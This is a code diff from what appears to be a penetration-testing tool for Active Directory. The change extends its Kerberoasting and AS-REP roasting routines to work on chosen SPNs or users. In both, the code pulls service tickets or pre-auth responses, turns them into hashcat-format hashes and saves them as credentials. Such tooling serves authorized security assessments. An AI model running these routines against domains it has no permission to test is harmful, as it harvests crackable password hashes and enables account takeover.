@@ -676,11 +676,91 @@ def adscan_worker(target, actions, creds, ldap_protocol, python_ldap, timeout):
 
                     if TGT != None:
 
-                        for user_spn in User.list_spns(ldapscan):
-                            entry = user_spn.to_json()
+                        if 'all' in actions['kerberoasting']['spns']:
+                            user_list = User.list_spns(ldapscan)
+                        else:
+                            user_list = actions['kerberoasting']['spns']
 
-                            if entry['username'] == 'krbtgt': 
-                                continue
+
+                        for user_spn in user_list:
+                            if type(user_spn) == User:
+                                entry = user_spn.to_json()
+
+                                if entry['username'] == 'krbtgt': 
+                                    continue
+
+                                user = '%s\\%s' % (entry['domain'], entry['username'])
+                                DB.insert_domain_user({
+                                    'domain': entry['domain'],
+                                    'username': entry['username'],
+                                    'user': user,
+                                    'fullname': entry['fullname'],
+                                    'comment': entry['comment'],
+                                    'created_date': entry['created_date'],
+                                    'last_logon': entry['last_logon'],
+                                    'last_password_change': entry['last_password_change'],
+                                    'primary_gid': entry['primary_gid'],
+                                    'sid': entry['sid'],
+                                    'rid': entry['rid'],
+                                    'dn': entry['dn'],
+                                    'tags': entry['tags'],
+                                    'group': entry['group'],
+                                    'aces': entry['aces'],
+                                    'owner': get_owner(entry['aces']),
+                                    'spns': entry['spns'],
+                                    'allowed_to_delegate_to': entry['allowed_to_delegate_to'],
+                                    'sid_history': entry['sid_history'],
+                                })
+                                Output.write({'target': ldapscan.url(), 'message': '- %s   %s' % (user.ljust(30), ",".join(entry['spns']))})
+
+                                spn = entry['spns'][0]
+                                username = entry['username'][:-1] if entry['username'].endswith('$') else entry['username']
+                            else:
+                                spn = user_spn
+                                entry = User.get_from_spn(ldapscan, user_spn)
+                                if entry != None:
+                                    entry = entry.to_json()
+                                    username = entry['username'][:-1] if entry['username'].endswith('$') else entry['username']
+                                    user = '%s\\%s' % (entry['domain'], entry['username'])
+                                
+                                    Output.write({'target': ldapscan.url(), 'message': '- %s   %s' % (user.ljust(30), ",".join(entry['spns']))})
+                                else:
+                                    spn = None
+                                    Output.error({'target': ldapscan.url(), 'message': 'SPN not found'})
+
+                            if spn != None:
+                                TGS = kerberos.getTGS(spn, TGT)
+
+                                output = kerberos.TGStoHashcat(TGS, username, spn)
+
+                                cred_info = {
+                                    'domain': entry['domain'],
+                                    'username': entry['username'],
+                                    'type': 'hash',
+                                    'format': 'krb5tgs',
+                                    'hash': output['tgs'],
+                                }
+                                DB.insert_domain_credential(cred_info)
+
+                                Output.vuln({'target': smbscan.url(), 'message': '- %s  (Kerberoasting)\n%s' % (user.ljust(50), output['tgs'])})
+                    else:
+                        Output.error({'target': smbscan.url(), 'message': 'Failed to get your TGT'})
+
+                else:
+                    raise NotImplementedError('Dumping users through SMB')
+
+            if 'asreproasting' in actions:
+                Output.highlight({'target': smbscan.url(), 'message': 'ASREP-roasting:'})
+                if ldap_authenticated:
+
+                    if 'all' in actions['asreproasting']['users']:
+                        user_list = User.list_donotrequirepreauth(ldapscan)
+                    else:
+                        user_list = actions['asreproasting']['users']
+
+                    for user_roast in user_list:
+                        if type(user_roast) == User:
+                            entry = user_roast.to_json()
 
                             user = '%s\\%s' % (entry['domain'], entry['username'])
                             DB.insert_domain_user({
@@ -704,78 +784,30 @@ def adscan_worker(target, actions, creds, ldap_protocol, python_ldap, timeout):
                                 'allowed_to_delegate_to': entry['allowed_to_delegate_to'],
                                 'sid_history': entry['sid_history'],
                             })
-                            Output.write({'target': ldapscan.url(), 'message': '- %s   %s' % (user.ljust(30), ",".join(entry['spns']))})
+                            Output.write({'target': ldapscan.url(), 'message': '- %s   %s  [%s]' % (user.ljust(30), entry['fullname'].ljust(30), ",".join(entry['tags']))})
 
-                            for spn in entry['spns']:
-                                TGS = kerberos.getTGS(spn, TGT)
-
-                                username = entry['username'][:-1] if entry['username'].endswith('$') else entry['username']
-
-                                output = kerberos.TGStoHashcat(TGS, username, spn)
-
-                                cred_info = {
-                                    'domain': entry['domain'],
-                                    'username': entry['username'],
-                                    'type': 'hash',
-                                    'format': 'krb5tgs',
-                                    'hash': output['tgs'],
-                                }
-                                DB.insert_domain_credential(cred_info)
-
-                                Output.vuln({'target': smbscan.url(), 'message': '- %s  (Kerberoasting)\n%s' % (user.ljust(50), output['tgs'])})
-                    else:
-                        Output.error({'target': smbscan.url(), 'message': 'Failed to get your TGT'})
-
-                else:
-                    raise NotImplementedError('Dumping users through SMB')
-
-            if 'asreproasting' in actions:
-                Output.highlight({'target': smbscan.url(), 'message': 'Kerberoasting:'})
-                if ldap_authenticated:
-                    for user_roast in User.list_donotrequirepreauth(ldapscan):
-                        entry = user_roast.to_json()
-
-                        user = '%s\\%s' % (entry['domain'], entry['username'])
-                        DB.insert_domain_user({
-                            'domain': entry['domain'],
-                            'username': entry['username'],
-                            'user': user,
-                            'fullname': entry['fullname'],
-                            'comment': entry['comment'],
-                            'created_date': entry['created_date'],
-                            'last_logon': entry['last_logon'],
-                            'last_password_change': entry['last_password_change'],
-                            'primary_gid': entry['primary_gid'],
-                            'sid': entry['sid'],
-                            'rid': entry['rid'],
-                            'dn': entry['dn'],
-                            'tags': entry['tags'],
-                            'group': entry['group'],
-                            'aces': entry['aces'],
-                            'owner': get_owner(entry['aces']),
-                            'spns': entry['spns'],
-                            'allowed_to_delegate_to': entry['allowed_to_delegate_to'],
-                            'sid_history': entry['sid_history'],
-                        })
-                        Output.write({'target': ldapscan.url(), 'message': '- %s   %s  [%s]' % (user.ljust(30), entry['fullname'].ljust(30), ",".join(entry['tags']))})
+                            target_user = entry['username']
+                        else:
+                            target_user = user_roast
+                            user = '%s\\%s' % (smb_info['domain'], user_roast)
 
                         kerberos = Kerberos(target['hostname'], smb_info['domain'])
                         try:
-                            asrep = kerberos.asrep_roasting(entry['username'])
+                            asrep = kerberos.asrep_roasting(target_user)
 
                             Output.vuln({'target': smbscan.url(), 'message': '- %s  (Kerberos pre-auth disabled !!!)\n%s' % (user.ljust(50), asrep)})
 
                             # insert domain vulnerability
                             DB.insert_domain_vulnerability({
                                 'hostname': target['hostname'],
-                                'domain': entry['domain'],
+                                'domain': smb_info['domain'],
                                 'name': 'Kerberos pre-auth disabled',
-                                'description': 'Kerberos pre-auth is disabled for user %s\\%s' % (entry['domain'], entry['username']),
+                                'description': 'Kerberos pre-auth is disabled for user %s\\%s' % (smb_info['domain'], target_user),
                             })
 
                             cred_info = {
-                                'domain': entry['domain'],
-                                'username': entry['username'],
+                                'domain': smb_info['domain'],
+                                'username': target_user,
                                 'type': 'hash',
                                 'format': 'krb5asrep',
                                 'hash': asrep,
